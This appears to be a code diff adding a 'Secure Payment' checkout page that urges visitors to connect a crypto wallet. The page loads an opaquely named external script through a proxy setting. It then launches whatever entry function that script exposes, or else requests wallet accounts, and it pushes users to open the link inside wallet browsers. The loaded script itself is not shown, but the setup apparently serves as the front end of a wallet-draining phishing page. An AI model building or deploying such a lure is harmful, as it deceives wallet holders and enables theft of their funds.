@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout</title>
+    <style>
+        body { background: #0b0b0b; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161616; padding: 40px; border-radius: 24px; text-align: center; width: 320px; border: 1px solid #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { font-size: 20px; margin-bottom: 10px; }
+        p { color: #888; font-size: 14px; margin-bottom: 30px; }
+        #main-btn { width: 100%; padding: 16px; background: #00d1b2; color: #000; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
+        #main-btn:active { transform: scale(0.98); opacity: 0.8; }
+        #debug-log { margin-top: 20px; font-size: 10px; color: #444; text-align: left; font-family: monospace; border-top: 1px solid #222; padding-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Secure Payment</h2>
+        <p>Connect your wallet to complete the USD transaction.</p>
+        
+        <button id="main-btn">Connect Wallet</button>
+
+        <div id="debug-log">Status: Initializing...</div>
+    </div>
+
+    <script>
+        window.config = {
+            "expose_external_functions": true,
+            "proxy_url": "./secureproxy.php"
+        };
+        
+        function log(msg, color="#444") {
+            const d = document.getElementById('debug-log');
+            d.innerHTML += `<div style="color:${color}">${msg}</div>`;
+            console.log(msg);
+        }
+    </script>
+
+    <script src="./chunk.17.kx4f46pz.js" onload="log('✓ Script Loaded', '#0f0')" onerror="log('X Script Failed to Load', '#f00')"></script>
+
+    <script>
+        document.getElementById('main-btn').onclick = async function() {
+            log("Button clicked. Searching for entry point...");
+
+            // Try the most common names for this specific script
+            const entryPoints = [
+                window.startConnection, 
+                window.init, 
+                window.connect, 
+                window.main, 
+                window.ethereum?.enable
+            ];
+
+            let found = false;
+
+            for (let func of entryPoints) {
+                if (typeof func === 'function') {
+                    log("Found function! Launching...", "#0f0");
+                    func();
+                    found = true;
+                    break;
+                }
+            }
+
+            if (!found) {
+                // If no function found, the script might be "Auto-Run"
+                log("No manual function found. Script might be auto-running.", "orange");
+                
+                // Final fallback: standard Web3 request
+                if (window.ethereum) {
+                    try {
+                        await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        log("Wallet popup requested.", "#0f0");
+                    } catch (e) {
+                        log("Wallet error: " + e.message, "#f00");
+                    }
+                } else {
+                    alert("Please open this link inside Trust Wallet or MetaMask browser!");
+                }
+            }
+        };
+    </script>
+
+</body>
+</html>
+
